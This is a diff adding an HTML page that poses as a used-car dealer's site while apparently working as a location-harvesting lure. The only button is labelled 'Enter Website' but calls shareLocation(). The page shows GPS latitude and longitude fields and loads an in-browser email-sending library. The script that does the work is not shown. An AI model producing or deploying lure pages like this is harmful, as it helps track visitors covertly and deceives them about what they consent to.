@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Auto World Mobile – Accident Free American Cars</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link rel="stylesheet" href="styles.css" />
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+</head>
+
+<body>
+  <header class="navbar">
+    <div class="brand">
+      <div class="logo-badge">
+        <span>AW</span>
+      </div>
+      <div class="brand-text">
+        <strong>Auto World</strong>
+        <small>Car vehicle telemetry</small>
+      </div>
+    </div>
+
+    <nav class="nav-links">
+      <a href="index.html">Home</a>
+      <a href="about.html">Cars</a>
+      <a href="privacy.html">Privacy</a>
+      <a href="app.html" class="active">Mobile App</a>
+    </nav>
+  </header>
+
+  <main class="page">
+    <div class="content-card" style="margin-bottom: 20px;">
+      <h1>Accident Free American Cars</h1>
+      <p>
+        At <strong>Auto World</strong>, we make finding your next car simple and reliable. 
+        Our mission is to connect drivers with quality vehicles they can trust.
+      </p>
+    </div>
+
+    <div class="app-frame">
+      <div class="app-notch"></div>
+      <div class="app-top">
+        <span>AutoTrace Mobile</span>
+      </div>
+
+      <div class="app-screen">
+        <div style="display:flex; align-items:center; justify-content:space-between; margin-bottom:12px;">
+          <div>
+            <div style="font-size:15px; font-weight:600;">Car Telemetry</div>
+            <div style="font-size:11px; color:#9ca3af;">Instant reading</div>
+          </div>
+          <div style="display:flex; gap:6px;">
+            <div class="icon-bubble gps">🚗</div>
+            <div class="icon-bubble sms">🛠️</div>
+            <div class="icon-bubble mail">📄</div>
+          </div>
+        </div>
+
+        <div class="gps-preview" style="margin-bottom:18px;">
+          <div class="gps-row">
+            <span class="gps-label">Lat</span>
+            <span class="gps-value" id="latValue">– – – – –</span>
+          </div>
+          <div class="gps-row">
+            <span class="gps-label">Lng</span>
+            <span class="gps-value" id="lngValue">– – – – –</span>
+          </div>
+          <div class="gps-row">
+            <span class="gps-label">Status</span>
+            <span class="gps-value" id="status">Ready</span>
+          </div>
+        </div>
+
+        <button class="primary" id="shareBtn" onclick="shareLocation()">
+          <span>Enter Website ➜</span>
+        </button>
+
+        <div class="loader" id="loader" style="display:none;"></div>
+      </div>
+    </div>
+
+    <footer class="footer">
+      <div>© 2025 AutoTrace Systems Ltd. · Mobile-style  screen.</div>
+      <div>
+
+      </div>
+    </footer>
+  </main>
+
+  <script src="main.js"></script>
+</body>
+</html>
